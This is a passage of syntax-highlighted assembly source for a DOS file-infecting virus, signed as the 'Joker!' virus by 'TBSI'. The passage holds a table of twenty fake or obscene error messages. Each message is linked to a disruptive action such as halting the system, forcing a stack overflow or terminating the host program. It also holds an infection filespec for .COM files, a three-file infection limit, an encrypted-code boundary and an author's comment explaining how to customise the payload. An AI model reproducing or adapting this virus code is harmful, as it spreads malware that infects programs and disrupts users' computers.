        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;Read 1 sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;Start at boot sector</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boot_sector</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;BX points to buffer</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">             </span><span class="sc1">;Flash light on A:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ResumeProgram</span><span class="sc0">     </span><span class="sc1">;Resume if no error</span><span class="sc0">

</span><span class="sc5">zpause</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc14">pause</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Point to pause message</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">;Print string</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">
</span><span class="sc5">zwait</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;Wait for keypress</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to ^</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ResumeProgram</span><span class="sc0">     </span><span class="sc1">;Go on...</span><span class="sc0">





</span><span class="sc5">ARIFmsg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'Abort, Retry, Ignore, Fail?$'</span><span class="sc0">
</span><span class="sc5">fail24</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'Fail on INT 24'</span><span class="sc0">
</span><span class="sc5">crlf</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">message_table</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg1</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg2</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg3</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg4</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg5</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg6</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg7</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg8</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg9</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg10</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg11</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg12</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg13</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg14</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg15</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg16</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg17</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg18</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg19</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg20</span><span class="sc0">

</span><span class="sc5">msgs</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20</span><span class="sc0">

</span><span class="sc1">;     I tried to make it as simple as possible to change the messages</span><span class="sc0">
</span><span class="sc1">;     and add/delete them.  Each message is in the format:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       db  [technique]</span><span class="sc0">
</span><span class="sc1">;[label]    db  [Text]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     Where [technique] is one of the 8 codes shown at the beginning of</span><span class="sc0">
</span><span class="sc1">;     this file (terminate, halt, etc.).  This determines what the virus</span><span class="sc0">
</span><span class="sc1">;     should do after printing the message.</span><span class="sc0">
</span><span class="sc1">;       [label] is in the form "msg##" where ## is a number from 1 to</span><span class="sc0">
</span><span class="sc1">;           "msgs".  "msgs" is defined immediately before this</span><span class="sc0">
</span><span class="sc1">;           comment block.</span><span class="sc0">
</span><span class="sc1">;       [text] is a combination of text and ASCII codes, terminated by</span><span class="sc0">
</span><span class="sc1">;           either a '$' or a ,36.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     If you change the number of messages the virus has, you should also</span><span class="sc0">
</span><span class="sc1">;       add/remove lines from the offset table and change the "msgs"</span><span class="sc0">
</span><span class="sc1">;       data byte appropriately.  Let's say for instance that you want</span><span class="sc0">
</span><span class="sc1">;       to remove "Program too big to fit in memory.":</span><span class="sc0">
</span><span class="sc1">;           1) Delete the line(s) with the message and the line</span><span class="sc0">
</span><span class="sc1">;               immediately before it.</span><span class="sc0">
</span><span class="sc1">;           2) Move message #20 up to message #2's position and</span><span class="sc0">
</span><span class="sc1">;               change its label from "msg20" to "msg2".</span><span class="sc0">
</span><span class="sc1">;           3) Delete the line "dw  offset msg20" from the offset</span><span class="sc0">
</span><span class="sc1">;               table.</span><span class="sc0">
</span><span class="sc1">;           4) Change the line before this comment block to:</span><span class="sc0">
</span><span class="sc1">;               "msgs   db  19"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Later!</span><span class="sc0">
</span><span class="sc1">;   -The BOOT SECTOR Infector ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">FlashFloppy</span><span class="sc0"> </span><span class="sc1">;Waits for key, then flashes drive A:</span><span class="sc0">
</span><span class="sc5">msg5</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc12">'m hungry!  Insert PIZZA &amp; BEER into drive A: and'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc0">
</span><span class="sc14">pause</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Strike any key when ready... $'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">SimulateCritErr</span><span class="sc0"> </span><span class="sc1">;Prints ARIF message and responds appropriately</span><span class="sc0">
</span><span class="sc5">msg1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Impotence error reading user'</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc12">'s dick$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">terminate</span><span class="sc0">   </span><span class="sc1">;Ends the program immediately</span><span class="sc0">
</span><span class="sc5">msg2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Program too big to fit in memory'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">halt</span><span class="sc0">        </span><span class="sc1">;Halts the system</span><span class="sc0">
</span><span class="sc5">msg3</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Cannot load COMMAND, system halted'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">terminate</span><span class="sc0">   </span><span class="sc1">;Ends the program immediately</span><span class="sc0">
</span><span class="sc5">msg4</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc12">'m sorry, Dave.... but I'</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc12">'m afraid'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' I can'</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc12">'t do that!'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">WaitKey</span><span class="sc0">     </span><span class="sc1">;Waits for a keypress, then runs the program</span><span class="sc0">
</span><span class="sc5">msg6</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Format another? (Y/N)? $'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">StackError</span><span class="sc0">  </span><span class="sc1">;Generates a stack overflow (halts the system)</span><span class="sc0">
</span><span class="sc5">msg7</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Damn it!  I told you not to touch that!$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">terminate</span><span class="sc0">   </span><span class="sc1">;Ends the program immediately</span><span class="sc0">
</span><span class="sc5">msg8</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Suck me!'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">SimulateCritErr</span><span class="sc0"> </span><span class="sc1">;Prints ARIF message and responds appropriately</span><span class="sc0">
</span><span class="sc5">msg9</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Cocksucker At Keyboard error reading device CON:$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">terminate</span><span class="sc0">   </span><span class="sc1">;Ends the program immediately</span><span class="sc0">
</span><span class="sc5">msg10</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc12">'m sorry, but your call cannot be completed as dialed.'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'Please hang up &amp; try your call again.'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">terminate</span><span class="sc0">   </span><span class="sc1">;Ends the program immediately</span><span class="sc0">
</span><span class="sc5">msg11</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'No!'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">halt</span><span class="sc0">        </span><span class="sc1">;Halts the system</span><span class="sc0">
</span><span class="sc5">msg12</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Panic kernal mode interrupt$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">WaitKey</span><span class="sc0">     </span><span class="sc1">;Waits for a keypress, then runs the program</span><span class="sc0">
</span><span class="sc5">msg13</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CONNECT 1200'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">return2host</span><span class="sc0"> </span><span class="sc1">;Runs host program immediately</span><span class="sc0">
</span><span class="sc5">msg14</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Okay, okay!  Be patient! ...'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">terminate</span><span class="sc0">   </span><span class="sc1">;Ends the program immediately</span><span class="sc0">
</span><span class="sc5">msg15</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'And if I refuse?'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">return2host</span><span class="sc0"> </span><span class="sc1">;Runs host program immediately</span><span class="sc0">
</span><span class="sc5">msg16</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Fuck the world and its followers!'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">return2host</span><span class="sc0"> </span><span class="sc1">;Runs host program immediately</span><span class="sc0">
</span><span class="sc5">msg17</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'You are pathetic, man... you know that?'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">terminate</span><span class="sc0">   </span><span class="sc1">;Ends the program immediately</span><span class="sc0">
</span><span class="sc5">msg18</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Cum on!  Talk DIRTY to me !!!'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">terminate</span><span class="sc0">   </span><span class="sc1">;Ends the program immediately</span><span class="sc0">
</span><span class="sc5">msg19</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Your coprocessor wears floppy disks!'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">PauseKey</span><span class="sc0">    </span><span class="sc1">;Waits for keypress (SAKWR), then runs host prg</span><span class="sc0">
</span><span class="sc5">msg20</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Joker! ver 薛 by TBSI!'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Remember!  EVERYTHING'</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc12">'s bigger in Texas!'</span><span class="sc4">,</span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">int24handler</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;Ignore the error</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                    </span><span class="sc1">;Interrupt return</span><span class="sc0">


</span><span class="sc5">filespec</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;File specification</span><span class="sc0">
</span><span class="sc5">prevdir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;previous directory</span><span class="sc0">
</span><span class="sc5">max2kill</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;max. files to infect</span><span class="sc0">

</span><span class="sc5">eoec</span><span class="sc4">:</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴횱nd Of Encrypted Code</span><span class="sc0">
</span><span class="sc5">VersionNumber</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">100h</span><span class="sc0">                </span><span class="sc1">;Version 1.00</span><span class="sc0">
</span><span class="sc5">encrypt_val</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;1st-run copy only</span><span class="sc0">

</span><span class="sc1">; None of this information is included in the virus's code.  It is only used</span><span class="sc0">
</span><span class="sc1">; during the search/infect routines and it is not necessary to preserve it</span><span class="sc0">
</span><span class="sc1">; in between calls to them.</span><span class="sc0">

</span><span class="sc5">eof</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;internal search's data</span><span class="sc0">
</span><span class="sc5">attribute</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;attribute</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;file's time stamp</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;file's date stamp</span><span class="sc0">
</span><span class="sc5">file_size</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;file's size</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;filename</span><span class="sc0">

</span><span class="sc5">SavedAX</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;Used to save AX</span><span class="sc0">
</span><span class="sc5">infected</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;infection count</span><span class="sc0">
</span><span class="sc10">addr</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;Address</span><span class="sc0">

</span><span class="sc5">boot_sector</span><span class="sc4">:</span><span class="sc0">

                            </span><span class="sc5">main</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc1">;rocedure</span><span class="sc0">
                            </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc1">;egment</span><span class="sc0">

            </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0"></span></div></body>
</html>
